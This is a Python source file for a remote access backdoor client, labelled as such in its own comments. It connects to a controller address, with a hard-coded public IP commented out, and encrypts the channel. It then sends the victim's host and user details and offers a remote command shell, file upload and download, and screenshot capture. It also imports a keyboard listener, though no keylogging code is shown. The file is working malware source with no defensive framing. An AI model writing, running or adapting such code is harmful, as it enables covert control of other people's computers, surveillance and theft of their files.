import socket, os, time, subprocess, mss, rsa
from cryptography.fernet import Fernet 
from pynput import keyboard

address = ("0.0.0.0", 3000) # "45.61.136.109"
authed = False


# Connection and data transfer related functions
def establish_connection(address=address):
    global server_con, authed, lck
    public_key, private_key = rsa.newkeys(512)

    print("attempting to establish secure connection...")
    while not authed:
        try:
            server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_con.connect((address[0],address[1]))

            public_key_buff = public_key.save_pkcs1('PEM')
            send(data=public_key_buff, sock=server_con, is_authed=authed)

            encrypted_key_buff = recv(sock=server_con, is_authed=authed)
            if encrypted_key_buff:
                key = rsa.decrypt(encrypted_key_buff, private_key)
                lck = Fernet(key)
                authed = True
                
                send_sys_info()
                print(f"Connection Established! Server: {address[0]}:{address[1]}")
                return server_con
            else:
                close_connection(sock=server_con)
                time.sleep(10)

        except ConnectionRefusedError:
            print("establish_connection(): Connection Refused")
            time.sleep(5)

        except Exception as e:
            print("establish_connection(): exception occurred")
            print(e)
            close_connection(sock=server_con)



def recv(time_out=None, sock=None, is_authed=None, buff_size=1024):
    sock.settimeout(time_out)
    data_size = sock.recv(12)
    if not data_size:
        return None
    
    data_buff = bytes()
    while len(data_buff) < int(data_size):
        data_buff += sock.recv(buff_size)

    sock.settimeout(None)
    return decrypt(data_buff) if is_authed else data_buff


def send(data, sock=None, is_authed=None, header_size=12):
    if not data:
         return

    if is_authed:
        data = encrypt(data)
    
    data_size = f"{len(data):<{header_size}}"
    sock.sendall(data_size.encode()+data)


def encrypt(data):
    return lck.encrypt(data)


def decrypt(encrypted_data):
    return lck.decrypt(encrypted_data)


def close_connection(sock):
    global authed 
    authed = False
    if sock:
        sock.close()


def reset_connection(sock=None, address=address):
    close_connection(sock=sock)
    return establish_connection(address=address)

# Backdoor specific functions
def take_screen_shot():
    try:
        if mss.mss().monitors:
            raw_pixels = mss.mss().grab(mss.mss().monitors[0])
            img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
            global server_con, authed
            send(sock=server_con, data=img_data, is_authed=authed)
    except mss.ScreenShotError:
        print("Unable to take screenshot.")

def send_sys_info():
    global server_con, authed
    if os.name == "nt":
        device_info = f"""Client Name: {win32api.GetComputerName()}&User: {win32api.GetUserName()}&Password: {'Dunno🤷🏻‍♂️'}"""
    else: 
        device_info = f"""Client Name: {os.uname().nodename}&Local IP: {socket.gethostbyname(os.uname().nodename)}&User: {os.getlogin()}&Password: {'Dunno🤷🏻‍♂️'}"""
    send(sock=server_con, data=device_info.encode(), is_authed=authed)

def upload_file(file_name):
    global server_con, authed
    try:
        with open(f"{file_name}", "rb") as file:
            file_data = file.read()
            send(sock=server_con, data=file_data, is_authed=authed)

    except FileNotFoundError:
        print("Error, file not found")

def download_file(file_name, file_path, buff_size=524288):
    try:
        file_data = recv(buff_size=buff_size, time_out=5, sock=server_con, is_authed=authed)
        
        if file_data:
            file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
            file.write(file_data)
            file.close()
        else:
            print("Error, couldn't download the file.")

    except socket.timeout:
        print("Could not download file. Connection timed out.")




def open_shell():
    global server_con, authed
    while True:
        #clearprint("waiting for cmd...")
        cmd = recv(sock=server_con, is_authed=authed) 
        cmd_output_buff = b""

        if not cmd:
            break

        cmd = cmd.decode()

        if cmd == "exit":
            break

        elif cmd[:2] == "cd":
            dir = cmd[3:]
            try:
                os.chdir(dir)
            except FileNotFoundError as e:
                cmd_output_buff = str(e).encode()
            else:
                cmd_output_buff = os.getcwd().encode()

        elif cmd[:2] == "dw":
            file_name = cmd[3:]
            print(f"Uploading File...{file_name}")
            upload_file(file_name)
            continue

        elif cmd[:2] == "up":
            file_name = cmd[3:]
            print(f"Downloading File...{file_name}")
            download_file(file_name=file_name, file_path=os.getcwd())
            continue

        else:
            output = subprocess.Popen(f'{cmd}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
            cmd_output_buff = output[0] + output[1]
    
        if not cmd_output_buff:
            cmd_output_buff = b'%%NONE%%'

        send(sock=server_con, data=cmd_output_buff, is_authed=authed)


#program entry
def main():
    global server_con, authed, ping_address
    server_con = establish_connection(address)
    
    while server_con:
        try:
            choice = recv(sock=server_con, is_authed=authed)
            if not choice:
                print("Connection to host lost...")
                server_con = reset_connection()

            elif choice == b"1":
                print("Opening Shell...")
                open_shell()

            elif choice == b"2":
                take_screen_shot()

            elif choice == b"3":
                pass

            elif choice == b"4":
                keep_alive = recv(sock=server_con, is_authed=authed).decode().lower()
                if keep_alive == 'y' or keep_alive == 'yes':
                    server_con = reset_connection()
                else:
                    break

        except KeyboardInterrupt:
            break

        except (ConnectionError, OSError, socket.error) as e:
            print(e)
            server_con = reset_connection()

    close_connection(sock=server_con)

main()


